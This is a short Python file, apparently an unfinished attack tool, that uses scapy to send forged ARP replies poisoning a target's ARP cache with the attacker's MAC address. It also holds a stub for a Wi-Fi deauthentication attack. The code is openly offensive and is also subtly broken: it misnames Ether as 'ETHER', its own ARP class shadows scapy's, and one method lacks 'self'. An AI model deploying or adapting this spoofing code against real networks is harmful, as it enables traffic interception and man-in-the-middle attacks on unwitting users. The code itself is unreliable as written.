from scapy.all import *
import lib


class ARP :
    def __init__(self,target) :
        self.target = target
        self.attacker_MAC = lib.get_mac_adress()
    def Spoof(self,target_mac,spoof_ip):
        arp_target = ETHER(dst=target_mac)/ARP(op=2,pdst=self.target,hwdst=target_mac,
                                               psrc=spoof_ip,hwsrc=self.attacker_MAC)
        sendp(arp_target,iface=conf.iface)



class Wifi : 
    def __init__(self) -> None:
        pass
    def deauthenticate():
        pass